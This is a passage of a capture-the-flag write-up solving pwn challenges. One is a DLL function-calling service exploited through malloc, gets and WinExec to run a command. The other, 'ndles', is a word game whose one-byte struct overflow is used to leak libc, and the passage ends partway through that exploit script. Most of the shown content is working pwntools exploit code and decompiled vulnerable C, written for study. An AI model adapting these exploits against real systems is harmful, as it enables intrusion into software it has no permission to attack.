</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(errno_)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(errno_)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(io<span style="color:#f92672">.</span>recvline())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Run this lead us know the value of errno variable is 2.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>b<span style="color:#e6db74">&#34;Alright, we&#39;re calling it!\r\n&#34;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;\x02\r\n&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Result: 0\r\n&#39;</span>
</span></span><span style="display:flex;"><span>b<span style="color:#e6db74">&#39;Which module would you like to load?\r\n&#39;</span>
</span></span></code></pre></div><p>By referring to this <a href="https://learn.microsoft.com/en-us/cpp/c-runtime-library/errno-constants?view=msvc-170">page</a>, I see that <code>ENOENT</code> has a value equal to 2, so it&rsquo;s equivalent to the error string <code>the command interpreter can't be found</code>.</p>
<h2 id="solve-script-2">Solve script</h2>
<p><code>solve.py</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">1337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>print(out)
</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(heap_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;/bin/bash&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;kernel32.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;WinExec&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;./submitter&#39;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;LiveCTF{&#39;</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Flag: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, flag)
</span></span></code></pre></div><p><code>solve1.py</code> (didn&rsquo;t work on remote)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">31337</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;wine&#34;</span>, <span style="color:#e6db74">&#34;challenge.exe&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, int(PORT))
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>heap_addr <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(heap_addr))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;malloc&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(<span style="color:#ae81ff">0x100</span>)<span style="color:#f92672">.</span>encode()) 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Result: &#39;</span>)
</span></span><span style="display:flex;"><span>out <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>errno_ <span style="color:#f92672">=</span> int(out<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;: &#39;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>print(hex(errno_))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;gets&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cmd.exe&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;puts&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;msvcrt.dll&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;system&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(str(heap_addr)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="pwn---ndles">Pwn - ndles</h1>
<p><a href="">Attachment</a></p>
<h2 id="source-code-overview-4">Source-code overview</h2>
<p>This challenge provides a small game, we can define the length of the solution and the number of attempts to guess.</p>
<p>The 2 following structs which the challenge uses to handle the game.</p>
<p><code>game_t</code> struct</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">game_t</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> guess_cnt;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">guess_t</span> guess[<span style="color:#ae81ff">8</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">guess_t</span> sol;
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><p><code>guess_t</code> struct</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#66d9ef">guess_t</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8_t</span> letter_cnt;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> letters[<span style="color:#ae81ff">9</span>];
</span></span><span style="display:flex;"><span>};
</span></span></code></pre></div><h2 id="bug-1">Bug</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span> <span style="color:#66d9ef">if</span> ( sol_length <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">10u</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( guess_cnt <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">8u</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      game.guess_cnt <span style="color:#f92672">=</span> guess_cnt;
</span></span><span style="display:flex;"><span>      game.sol.letter_cnt <span style="color:#f92672">=</span> sol_length;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> game.sol.letter_cnt; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>        game.sol.letters[i] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> ( j <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; j <span style="color:#f92672">&lt;</span> game.guess_cnt; <span style="color:#f92672">++</span>j )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        game.guess[j].letter_cnt <span style="color:#f92672">=</span> game.sol.letter_cnt;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( k <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; k <span style="color:#f92672">&lt;</span> game.guess[j].letter_cnt; <span style="color:#f92672">++</span>k )
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>savedregs <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> j <span style="color:#f92672">+</span> k <span style="color:#f92672">-</span> <span style="color:#ae81ff">142</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;v&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">3u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">4u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">5u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">5</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;s&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">6u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">6</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;e&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">7u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">7</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;r&#39;</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( game.sol.letter_cnt <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">8u</span> )
</span></span><span style="display:flex;"><span>        game.sol.letters[<span style="color:#ae81ff">8</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;s&#39;</span>;
</span></span><span style="display:flex;"><span>      v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">for</span> ( m <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; m <span style="color:#f92672">&lt;</span> game.guess_cnt; <span style="color:#f92672">++</span>m )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;What is your guess #%d?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(m <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; n <span style="color:#f92672">&lt;</span> game.guess[m].letter_cnt; <span style="color:#f92672">++</span>n )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>            v10 <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>();
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span> ( ((<span style="color:#f92672">*</span><span style="color:#a6e22e">__ctype_b_loc</span>())[(<span style="color:#66d9ef">char</span>)v10] <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x2000</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> );
</span></span><span style="display:flex;"><span>          <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>savedregs <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> m <span style="color:#f92672">+</span> n <span style="color:#f92672">-</span> <span style="color:#ae81ff">142</span>) <span style="color:#f92672">=</span> v10;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( ii <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; ii <span style="color:#f92672">&lt;=</span> m; <span style="color:#f92672">++</span>ii )
</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">print_guess</span>(<span style="color:#f92672">&amp;</span>game.guess[ii], <span style="color:#f92672">&amp;</span>game.sol);
</span></span><span style="display:flex;"><span>        v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> ( jj <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; jj <span style="color:#f92672">&lt;</span> game.sol.letter_cnt; <span style="color:#f92672">++</span>jj )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(<span style="color:#f92672">&amp;</span>savedregs <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">*</span> m <span style="color:#f92672">+</span> jj <span style="color:#f92672">-</span> <span style="color:#ae81ff">142</span>) <span style="color:#f92672">!=</span> game.sol.letters[jj] )
</span></span><span style="display:flex;"><span>          {
</span></span><span style="display:flex;"><span>            v8 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>          }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( v8 )
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>      }
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v13 )
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;That&#39;s the correct word! You win!&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;You couldn&#39;t guess the word! You lose!&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Guess count too long!&#34;</span>);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Solution length too long!&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The only bug I found in this challenge is the one-byte overflow to the next struct because it allows us to have solution string up to 10 characters long but actually only 9 chars.</p>
<p>So, I used this bug to leak and did a basic buffer overflow.</p>
<h2 id="solve-script-3">Solve script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./challenge_patched&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(HOST, PORT)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; be?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;10&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; get?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;7&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;What is your guess #1?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;123456789</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">9</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x6c</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\xff</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>pause()
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;What is your guess #2?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>, pay)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;What is your guess #3?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;30;42m &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[1;30;43m &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1b</span><span style="color:#e6db74">[0m &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> leak<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(leak[<span style="color:#ae81ff">0x9b</span>:<span style="color:#ae81ff">0x9b</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>]) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x29d90</span>
